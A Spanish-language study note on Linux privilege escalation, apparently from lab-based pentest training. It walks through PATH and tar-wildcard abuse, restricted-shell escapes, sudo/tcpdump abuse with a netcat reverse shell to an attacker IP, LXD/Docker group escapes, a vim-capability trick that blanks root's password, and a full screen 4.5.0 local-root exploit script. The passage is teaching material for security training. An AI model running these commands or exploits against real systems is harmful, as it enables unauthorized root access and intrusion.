---
tags:
  - Post-Explotacion
  - Escalada-Privilegios
---

# Escalada mediante Ambiente

## Abuso de PATH

[PATH](http://www.linfo.org/path_env_var.html) es una variable de entorno que especifica el conjunto de directorios donde se puede ubicar un ejecutable. La variable PATH de una cuenta es un conjunto de rutas absolutas, lo que permite a un usuario escribir un comando sin especificar la ruta absoluta al binario. Por ejemplo, un usuario puede escribir `cat /tmp/test.txt` en lugar de especificar el camino absoluto `/bin/cat /tmp/test.txt`. Podemos comprobar el contenido de la variable PATH escribiendo `env | grep PATH` o `echo $PATH`.

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Añadiendo `.` a la PATH de un usuario agrega su directorio de trabajo actual a la lista. Por ejemplo, si podemos modificar la ruta de un usuario, podríamos reemplazar un binario común como `ls` con un script malicioso como un shell inverso. Si agregamos `.` a la ruta emitiendo el comando `PATH=.:$PATH` y luego `export PATH`, podremos ejecutar binarios ubicados en nuestro directorio de trabajo actual simplemente escribiendo el nombre del archivo (es decir, simplemente escribiendo `ls` llamará al script malicioso nombrado `ls` en el directorio de trabajo actual en lugar del binario ubicado en `/bin/ls`).


```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

En este ejemplo, modificamos la ruta para ejecutar un simple `echo` comando cuando el comando `ls` está escrito.

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```


## Abuso de Wildcard

Un carácter comodín se puede utilizar como un reemplazo para otros caracteres y son interpretados por el shell antes de otras acciones. Ejemplos de comodines incluyen:

|**Carácter**|**Importancia**|
|---|---|
|`*`|Un asterisco que puede coincidir con cualquier número de caracteres en un nombre de archivo.|
|`?`|Coincide con un solo personaje.|
|`[ ]`|Los soportes encierran caracteres y pueden coincidir con uno solo en la posición definida.|
|`~`|Una tilde al principio se expande al nombre del directorio de inicio del usuario o puede tener otro nombre de usuario adjunto para referirse al directorio de inicio de ese usuario.|
|`-`|Un guión entre paréntesis denotará un rango de caracteres.|

Un ejemplo de cómo se puede abusar de los comodines para la escalada de privilegios es el `tar` comando, un programa común para crear/extraer archivos. Si miramos el [página de manual](http://man7.org/linux/man-pages/man1/tar.1.html) para el `tar` comando, vemos lo siguiente:

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

El `--checkpoint-action` la opción permite un `EXEC` acción que se ejecutará cuando se alcance un punto de control (es decir, ejecute un comando arbitrario del sistema operativo una vez que se ejecute el comando tar)

Al crear archivos con estos nombres, cuando se especifica el comodín, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh` se pasa a `tar` como opciones de línea de comandos. Veamos esto en la práctica.

Podemos aprovechar el comodín en el trabajo cron para escribir los comandos necesarios como nombres de archivo con lo anterior en mente. Cuando se ejecuta el trabajo cron, estos nombres de archivo se interpretarán como argumentos y ejecutarán los comandos que especifiquemos.

**Tarea cron**

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Una vez que el trabajo cron se ejecuta nuevamente, podemos verificar los privilegios de sudo recién agregados y sudo para rootear directamente.


```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```


## Escaping Restricted Shells

#### Atajo

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



Un shell restringido es un tipo de shell que limita la capacidad del usuario para ejecutar comandos. En un shell restringido, el usuario solo puede ejecutar un conjunto específico de comandos o solo puede ejecutar comandos en directorios específicos. Los shells restringidos a menudo se utilizan para proporcionar un entorno seguro para los usuarios que pueden dañar accidental o intencionalmente el sistema o proporcionar una forma para que los usuarios accedan solo a ciertas características del sistema. Algunos ejemplos comunes de conchas restringidas incluyen el `rbash` shell en Linux y el "Sell de acceso restringido" en Windows.

#### RBASH
[Shell Bourne restringido](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) es una versión restringida del shell Bourne, un intérprete de línea de comandos estándar en Linux que limita la capacidad del usuario para usar ciertas características del shell Bourne, como cambiar directorios, establecer o modificar variables de entorno y ejecutar comandos en otros directorios. A menudo se utiliza para proporcionar un entorno seguro y controlado para los usuarios que pueden dañar accidental o intencionalmente el sistema.

#### RKSH
[Concha Korn restringida](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) es una versión restringida del shell Korn, otro intérprete de línea de comandos estándar. El `rksh` shell limita la capacidad del usuario para usar ciertas características del shell Korn, como ejecutar comandos en otros directorios, crear o modificar funciones de shell y modificar el entorno del shell.


#### RZSH
[Shell Z restringido](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) es una versión restringida del shell Z y es el intérprete de línea de comandos más potente y flexible. El `rzsh` shell limita la capacidad del usuario para usar ciertas características del shell Z, como ejecutar scripts de shell, definir alias y modificar el entorno del shell.


### Escapando

En algunos casos, puede ser posible escapar de un shell restringido inyectando comandos en la línea de comandos u otras entradas que acepte el shell. Por ejemplo, supongamos que el shell permite a los usuarios ejecutar comandos pasándolos como argumentos a un comando incorporado. En ese caso, puede ser posible escapar del shell inyectando comandos adicionales en el argumento.

#### Inyección de comando
Por ejemplo, podríamos usar el siguiente comando para inyectar un `pwd` comando en el argumento de la `ls` comando:

  Escapando de Conchas Restringidas

```shell-session
vcrdcr@htb[/htb]$ ls -l `pwd` 
```

Este comando causaría el `ls` comando a ejecutar con el argumento `-l`, seguido de la salida de la `pwd` comando. Desde el `pwd` el comando no está restringido por el shell, esto nos permitiría ejecutar el `pwd` ordene y vea el directorio de trabajo actual, a pesar de que el shell no nos permite ejecutar el `pwd` comanda directamente.


#### Sustitución de Comando

Otro método para escapar de un shell restringido es usar sustitución de comandos. Esto implica usar la sintaxis de sustitución de comandos del shell para ejecutar un comando. Por ejemplo, imagine que el shell permite a los usuarios ejecutar comandos encerrándolos en backticks ('). En ese caso, puede ser posible escapar del shell ejecutando un comando en una sustitución de backtick que no esté restringida por el shell.

#### Encadenamiento de Comando

En algunos casos, puede ser posible escapar de un shell restringido mediante el uso de encadenamiento de comandos. Necesitaríamos usar múltiples comandos en una sola línea de comandos, separados por un metacaracter de shell, como un punto y coma (`;`) o una barra vertical (`|`), para ejecutar un comando. Por ejemplo, si el shell permite a los usuarios ejecutar comandos separados por punto y coma, puede ser posible escapar del shell utilizando un punto y coma para separar dos comandos, uno de los cuales no está restringido por el shell.


#### Variables de Medio Ambiente

Para escapar de un shell restringido para usar variables de entorno implica modificar o crear variables de entorno que el shell utiliza para ejecutar comandos que no están restringidos por el shell. Por ejemplo, si el shell utiliza una variable de entorno para especificar el directorio en el que se ejecutan los comandos, puede ser posible escapar del shell modificando el valor de la variable de entorno para especificar un directorio diferente.

#### Funciones de Shell

En algunos casos, puede ser posible escapar de un shell restringido mediante el uso de funciones de shell. Para esto podemos definir y llamar a funciones de shell que ejecutan comandos no restringidos por el shell. Digamos que el shell permite a los usuarios definir y llamar a las funciones de shell, es posible escapar del shell definiendo una función de shell que ejecuta un comando.

#### Comando echo
Puedes ver contenidos de archivos con el comando echo de la siguiente manera

```shell
echo "$(<flag.txt)"
```

# Escalada mediante Permisos

## Permisos especiales
### UID

El `Set User ID upon Execution` (`setuid`) el permiso puede permitir que un usuario ejecute un programa o script con los permisos de otro usuario, generalmente con privilegios elevados. El `setuid` bit aparece como un `s`.

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
```

### GID

El permiso Set-Group-ID (setgid) es otro permiso especial que nos permite ejecutar binarios como si fuéramos parte del grupo que los creó. Estos archivos se pueden enumerar utilizando el siguiente comando: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Estos archivos se pueden aprovechar de la misma manera que `setuid` binarios para escalar privilegios.

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```


### GTFOBinas

El [GTFOBinas](https://gtfobins.github.io/) project es una lista curada de binarios y scripts que un atacante puede usar para eludir las restricciones de seguridad. Cada página detalla las características del programa que se pueden usar para salir de shells restringidos, escalar privilegios, generar conexiones de shell inversas y transferir archivos. Por ejemplo, `apt-get` se puede usar para salir de entornos restringidos y generar un shell agregando un comando Pre-Invoke:

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

## Abuso sudo

Al aterrizar en un sistema, siempre debemos verificar si el usuario actual tiene algún privilegio sudo escribiendo `sudo -l`. A veces necesitaremos saber la contraseña del usuario para enumerar su `sudo` derechos, pero cualquier entrada de derechos con el `NOPASSWD` la opción se puede ver sin ingresar una contraseña.

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```


---


Por ejemplo, si el archivo sudoers se edita para otorgar a un usuario el derecho de ejecutar un comando como `tcpdump` por la siguiente entrada en el archivo sudoers: `(ALL) NOPASSWD: /usr/sbin/tcpdump` un atacante podría aprovechar esto para aprovechar un **postrotato-comando** opción.

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

Especificando el `-z` flag, un atacante podría usar `tcpdump` para ejecutar un script de shell, obtenga un shell inverso como usuario raíz o ejecute otros comandos privilegiados. Por ejemplo, un atacante podría crear el script de shell `.test` conteniendo un shell inverso y ejecutarlo de la siguiente manera:

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Probemos esto. Primero, haga un archivo para ejecutar con el `postrotate-command`, añadiendo un simple shell inverso de una línea.

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

A continuación, comienza un `netcat` oyente en nuestra caja de ataque y corre `tcpdump` como raíz con el `postrotate-command`. Si todo va según lo planeado, recibiremos una conexión de shell inversa raíz.

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

Recibimos una cáscara de raíz casi al instante.

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```


## Grupos privilegiados

### LXC/LXD

LXD es similar a Docker y es el administrador de contenedores de Ubuntu. Tras la instalación, todos los usuarios se agregan al grupo LXD. La membresía de este grupo se puede utilizar para escalar privilegios creando un contenedor LXD, haciéndolo privilegiado y luego accediendo al sistema de archivos host en `/mnt/root`. Confirmemos la membresía del grupo y usemos estos derechos para escalar a root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descomprime la imagen alpina.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Inicie el proceso de inicialización de LXD. Elija los valores predeterminados para cada mensaje. Consulta esto [publicar](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) para más información sobre cada paso.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importar la imagen local.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicie un contenedor privilegiado con el `security.privileged` establecer a `true` para ejecutar el contenedor sin un mapeo UID, haga que el usuario raíz en el contenedor sea el mismo que el usuario raíz en el host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Monte el sistema de archivos host.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finalmente, genere una carcasa dentro de la instancia de contenedor. Ahora podemos navegar por el sistema de archivos host montado como root. Por ejemplo, para acceder al contenido del directorio raíz en el tipo de host `cd /mnt/root/root`. Desde aquí podemos leer archivos sensibles como `/etc/shadow` y obtenga hashes de contraseña u obtenga acceso a claves SSH para conectarse al sistema host como root, y más.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```


### Docker

Colocar un usuario en el grupo docker es esencialmente equivalente al acceso de nivel raíz al sistema de archivos sin requerir una contraseña. Los miembros del grupo docker pueden generar nuevos contenedores docker. Un ejemplo sería ejecutar el comando `docker run -v /root:/mnt -it ubuntu`. Este comando crea una nueva instancia Docker con el directorio /root en el sistema de archivos host montado como un volumen. Una vez que se inicia el contenedor, podemos navegar por el directorio montado y recuperar o agregar claves SSH para el usuario raíz. Esto podría hacerse para otros directorios como `/etc` que podría ser utilizado para recuperar el contenido de la `/etc/shadow` archivo para descifrar contraseñas fuera de línea o agregar un usuario privilegiado.

---

### Disk

Los usuarios dentro del grupo de discos tienen acceso completo a cualquier dispositivo contenido en el mismo `/dev`, como `/dev/sda1`, que es típicamente el dispositivo principal utilizado por el sistema operativo. Un atacante con estos privilegios puede usar `debugfs` para acceder a todo el sistema de archivos con privilegios de nivel raíz. Al igual que con el ejemplo del grupo Docker, esto podría aprovecharse para recuperar claves SSH, credenciales o para agregar un usuario.

---

### ADM

Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`. Esto no otorga acceso root directamente, pero podría aprovecharse para recopilar datos confidenciales almacenados en archivos de registro o enumerar las acciones del usuario y ejecutar trabajos cron.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```


## Capabilities

Son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, lo que les permite realizar acciones específicas que de otro modo estarían restringidas.

Una vulnerabilidad común es el uso de capacidades para otorgar privilegios a procesos que no están adecuadamente sandbox o aislados de otros procesos, lo que nos permite escalar sus privilegios y obtener acceso a información confidencial o realizar acciones no autorizadas.

Otra vulnerabilidad potencial es el mal uso o el uso excesivo de las capacidades, lo que puede dar lugar a que los procesos tengan más privilegios de los que necesitan. Esto puede crear riesgos de seguridad innecesarios, ya que podríamos explotar estos privilegios para obtener acceso a información confidencial o realizar acciones no autorizadas.

#### Establecer Capacidad

  Por ejemplo, podríamos usar el siguiente comando para establecer el `cap_net_bind_service` capacidad para un ejecutable:

```shell-session
vcrdcr@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando las capacidades se establecen para un binario, significa que el binario será capaz de realizar acciones específicas que no sería capaz de realizar sin las capacidades. Por ejemplo, si el `cap_net_bind_service` la capacidad se establece para un binario, el binario será capaz de enlazar a los puertos de red, que es un privilegio generalmente restringido.


Algunas capacidades, como `cap_sys_admin`, lo que permite a un ejecutable realizar acciones con privilegios administrativos, puede ser peligroso si no se utilizan correctamente. Por ejemplo, podríamos explotarlos para escalar sus privilegios, obtener acceso a información confidencial o realizar acciones no autorizadas. Por lo tanto, es crucial establecer este tipo de capacidades para ejecutables correctamente sandbox y aislados y evitar otorgarlos innecesariamente.

#### Capabilities importantes

|**Capacidad**|**Descripción**|
|---|---|
|`cap_sys_admin`|Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar la configuración del sistema.|
|`cap_sys_chroot`|Permite cambiar el directorio raíz para el proceso actual, lo que le permite acceder a archivos y directorios que de otro modo serían inaccesibles.|
|`cap_sys_ptrace`|Permite adjuntar y depurar otros procesos, lo que potencialmente le permite obtener acceso a información confidencial o modificar el comportamiento de otros procesos.|
|`cap_sys_nice`|Permite aumentar o reducir la prioridad de los procesos, lo que potencialmente le permite obtener acceso a recursos que de otro modo estarían restringidos.|
|`cap_sys_time`|Permite modificar el reloj del sistema, lo que le permite manipular marcas de tiempo o hacer que otros procesos se comporten de manera inesperada.|
|`cap_sys_resource`|Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar.|
|`cap_sys_module`|Permite cargar y descargar módulos del kernel, lo que le permite modificar el comportamiento del sistema operativo u obtener acceso a información confidencial.|
|`cap_net_bind_service`|Permite enlazar a puertos de red, lo que le permite acceder a información confidencial o realizar acciones no autorizadas.|

Se pueden usar varias capacidades de Linux para escalar los privilegios de un usuario a `root`, incluyendo:

| **Capacidad**      | **Descripción**                                                                                                                                                                                                                                        |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `cap_setuid`       | Permite que un proceso establezca su ID de usuario efectivo, que se puede usar para obtener los privilegios de otro usuario, incluido el `root` usuario.                                                                                               |
| `cap_setgid`       | Permite establecer su ID de grupo efectivo, que se puede utilizar para obtener los privilegios de otro grupo, incluido el `root` grupo.                                                                                                                |
| `cap_sys_admin`    | Esta capacidad proporciona una amplia gama de privilegios administrativos, incluida la capacidad de realizar muchas acciones reservadas para el `root` usuario, como modificar la configuración del sistema y montar y desmontar sistemas de archivos. |
| `cap_dac_override` | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos.                                                                                                                                                           |

#### Valores de capabilities

Aquí hay algunos ejemplos de valores que podemos usar con el `setcap` comando, junto con una breve descripción de lo que hacen:

| **Valores de Capacidad** | **Descripción**                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                      | Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad establecida previamente para el ejecutable.                                                                                                                                                                                                                   |
| `+ep`                    | Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad.                                                                                                                                                 |
| `+ei`                    | Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad y los procesos secundarios generados por el ejecutable para heredar la capacidad y realizar las mismas acciones.                                                                                                                      |
| `+p`                     | Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable, pero evitar que herede la capacidad o permitir que los procesos secundarios la hereden. |

### Enumerar capabilities

```shell-session
vcrdcr@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Esta línea única usa el `find` comando para buscar todos los ejecutables binarios en los directorios donde se encuentran típicamente y luego utiliza el `-exec` bandera para correr el `getcap` comando en cada uno, mostrando las capacidades que se han establecido para ese binario. La salida de este comando mostrará una lista de todos los ejecutables binarios en el sistema, junto con las capacidades que se han establecido para cada uno.

```shell-session
vcrdcr@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```


### Explotación

Por ejemplo, el `/usr/bin/vim.basic` binary se ejecuta sin privilegios especiales, como con `sudo`. Sin embargo, porque el binario tiene el `cap_dac_override` conjunto de capacidades, puede escalar los privilegios del usuario que lo ejecuta. Esto permitiría que el probador de penetración obtuviera el `cap_dac_override` capacidad y realizar tareas que requieren esta capacidad.

Echemos un vistazo a la `/etc/passwd` archivo donde el usuario `root` se especifica:

```shell-session
vcrdcr@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos usar el `cap_dac_override` capacidad de la `/usr/bin/vim` binario para modificar un archivo del sistema:

```shell-session
vcrdcr@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

También podemos hacer estos cambios en un modo no interactivo:

```shell-session
vcrdcr@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
vcrdcr@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

# Escalada mediante Servicios
## Servicios vulnerables

Algunos servicios pueden ser vulnerables a la escalada de privilegios como screen la versión 4.5.0

### Screen

#### Identificación de la Versión de Screen

```shell-session
vcrdcr@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

Esto permite a un atacante truncar cualquier archivo o crear un archivo propiedad de root en cualquier directorio y, en última instancia, obtener acceso completo a root.

#### Escalada de Privilegios - Screen_Exploit.sh

```shell-session
vcrdcr@htb[/htb]$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

El siguiente script se puede utilizar para realizar este ataque de escalada de privilegios:

#### Screen_Exploit_POC.sh

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Abuso de tareas cron

El `crontab` el comando puede crear un archivo cron, que será ejecutado por el demonio cron en el horario especificado. Cuando se crea, el archivo cron se creará en `/var/spool/cron` para el usuario específico que lo crea. Cada entrada en el archivo crontab requiere seis elementos en el siguiente orden: minutos, horas, días, meses, semanas, comandos. Por ejemplo, la entrada `0 */12 * * * /home/admin/backup.sh` correría cada 12 horas.

El crontab raíz es casi siempre solo editable por el usuario raíz o un usuario con privilegios sudo completos; sin embargo, todavía se puede abusar. Puede encontrar un script de escritura mundial que se ejecute como root e, incluso si no puede leer el crontab para conocer el cronograma exacto, es posible que pueda determinar con qué frecuencia se ejecuta (es decir, un script de copia de seguridad que crea un `.tar.gz` archivo cada 12 horas). En este caso, puede agregar un comando al final del script (como un shell inverso de una línea), y se ejecutará la próxima vez que se ejecute el trabajo cron.

Ciertas aplicaciones crean archivos cron en el `/etc/cron.d` directorio y puede estar mal configurado para permitir que un usuario no root los edite.

### Búsqueda de archivos editables 

Primero, veamos alrededor del sistema en busca de archivos o directorios escribibles. El archivo `backup.sh` en el `/dmz-backups` el directorio es interesante y parece que podría estar ejecutándose en un trabajo cron.

```shell-session
vcrdcr@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```


Una mirada rápida en el `/dmz-backups` el directorio muestra lo que parecen ser archivos creados cada tres minutos. Esto parece ser una mala configuración importante. Quizás el administrador de sistemas pretendía especificar cada tres horas como `0 */3 * * *` pero en cambio escribió `*/3 * * * *`, que le dice al cron trabajo que corra cada tres minutos. El segundo problema es que el `backup.sh` shell script es world writeable y se ejecuta como root.


```shell-session
vcrdcr@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

### Ver que se esta ejecutando con pspy

Podemos confirmar que un trabajo cron se está ejecutando usando [pspy](https://github.com/DominicBreuker/pspy), una herramienta de línea de comandos utilizada para ver los procesos en ejecución sin la necesidad de privilegios de root. Podemos usarlo para ver comandos ejecutados por otros usuarios, cron jobs, etc. Funciona escaneando [procfs](https://en.wikipedia.org/wiki/Procfs).

Corramos `pspy` y echa un vistazo. El `-pf` flag le dice a la herramienta que imprima comandos y eventos del sistema de archivos y `-i 1000` le dice que escanee [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) cada 1000ms (o cada segundo).


```shell-session
vcrdcr@htb[/htb]$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
